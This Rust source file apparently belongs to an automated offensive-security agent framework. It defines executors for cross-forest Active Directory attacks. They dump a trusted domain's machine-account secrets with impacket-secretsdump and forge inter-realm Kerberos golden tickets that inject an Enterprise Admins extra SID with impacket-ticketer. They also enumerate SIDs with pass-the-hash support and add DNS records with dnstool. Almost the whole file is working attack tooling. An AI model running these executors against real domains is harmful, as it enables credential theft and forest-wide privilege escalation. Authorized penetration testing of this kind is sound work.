//! Trust / cross-forest tool executors.

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Extract trust keys by dumping secrets for a trusted domain's machine account.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `trusted_domain`
pub async fn extract_trust_key(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let trusted_domain = required_str(args, "trusted_domain")?;

    let (target_str, extra_args) =
        credentials::impacket_auth(Some(domain), username, Some(password), None, dc_ip);

    let just_dc_user = format!("{trusted_domain}$");

    CommandBuilder::new("impacket-secretsdump")
        .arg(target_str)
        .args(extra_args)
        .flag("-just-dc-user", just_dc_user)
        .timeout_secs(120)
        .execute()
        .await
}

/// Create an inter-realm / cross-forest Kerberos ticket using impacket-ticketer.
///
/// Required args: `trust_key`, `source_sid`, `source_domain`, `target_sid`,
///                `target_domain`
/// Optional args: `username`
pub async fn create_inter_realm_ticket(args: &Value) -> Result<ToolOutput> {
    let trust_key = required_str(args, "trust_key")?;
    let source_sid = required_str(args, "source_sid")?;
    let source_domain = required_str(args, "source_domain")?;
    let target_sid = required_str(args, "target_sid")?;
    let target_domain = required_str(args, "target_domain")?;
    let username = optional_str(args, "username").unwrap_or("Administrator");

    let extra_sid = format!("{target_sid}-519");
    let spn = format!("krbtgt/{target_domain}");

    CommandBuilder::new("impacket-ticketer")
        .flag("-nthash", trust_key)
        .flag("-domain-sid", source_sid)
        .flag("-domain", source_domain)
        .flag("-extra-sid", extra_sid)
        .flag("-spn", spn)
        .arg(username)
        .timeout_secs(120)
        .execute()
        .await
}

/// Look up domain SIDs using impacket-lookupsid.
///
/// Required args: `domain`, `username`, `dc_ip`
/// Auth: `password` (plaintext) OR `hash` (NTLM pass-the-hash). At least one required.
pub async fn get_sid(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = args
        .get("password")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty());
    let hash = args
        .get("hash")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty());
    let dc_ip = required_str(args, "dc_ip")?;

    if password.is_none() && hash.is_none() {
        anyhow::bail!("get_sid requires either 'password' or 'hash' for authentication");
    }

    let (target_str, extra_args) =
        credentials::impacket_auth(Some(domain), username, password, hash, dc_ip);

    CommandBuilder::new("impacket-lookupsid")
        .arg(target_str)
        .args(extra_args)
        .timeout_secs(120)
        .execute()
        .await
}

/// Manage DNS records using dnstool.py.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `record_name`,
///                `record_data`
/// Optional args: `action` (defaults to "add")
pub async fn dnstool(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let record_name = required_str(args, "record_name")?;
    let record_data = required_str(args, "record_data")?;
    let action = optional_str(args, "action").unwrap_or("add");

    let user_spec = format!("{domain}\\{username}");

    CommandBuilder::new("dnstool")
        .flag("-dc-ip", dc_ip)
        .flag("-u", user_spec)
        .flag("-p", password)
        .flag("-a", action)
        .flag("-r", record_name)
        .flag("-d", record_data)
        .arg(dc_ip)
        .timeout_secs(120)
        .execute()
        .await
}
